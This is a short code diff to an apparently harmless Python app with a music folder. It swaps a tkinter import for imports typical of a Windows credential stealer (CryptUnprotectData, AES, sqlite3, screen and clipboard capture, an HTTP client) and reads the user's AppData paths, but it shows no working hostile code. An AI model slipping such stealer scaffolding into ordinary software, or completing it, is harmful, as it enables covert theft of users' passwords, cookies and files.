@@ -12,8 +12,37 @@ import os
 import time
 import json
 import threading
-from tkinter import Tk
+import asyncio
+import ntpath
+import re
+import sqlite3
+import subprocess
+import winreg
+import zipfile
+import httpx
+import psutil
+import base64
+import ctypes
+import pyperclip
+import win32gui
+import win32con
 
+from sqlite3 import connect
+from base64 import b64decode
+from urllib.request import Request, urlopen
+from shutil import copy2
+from datetime import datetime, timedelta, timezone
+from sys import argv
+from tempfile import gettempdir, mkdtemp
+from json import loads, dumps
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from Crypto.Cipher import AES
+from PIL import ImageGrab
+from win32crypt import CryptUnprotectData
+
+local = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
+temp = os.getenv("TEMP")
 author = "! LO$R#0001"
 
 music_dir = "assets/music"
